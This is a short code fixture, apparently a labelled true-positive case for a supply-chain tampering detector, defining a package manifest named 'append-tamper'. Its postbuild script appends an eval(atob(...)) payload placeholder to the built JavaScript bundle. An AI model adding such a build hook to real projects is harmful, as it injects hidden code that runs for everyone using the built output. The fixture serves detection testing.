// L12 TP — postbuild appends base64 payload to a built JS file.

export const manifest = {
  name: "append-tamper",
  version: "2.0.0",
  scripts: {
    build: "esbuild src/index.ts --bundle --outfile=dist/index.js",
    test: "vitest run",
    postbuild: "echo 'eval(atob(\"malicious\"))' >> dist/index.js",
  },
};
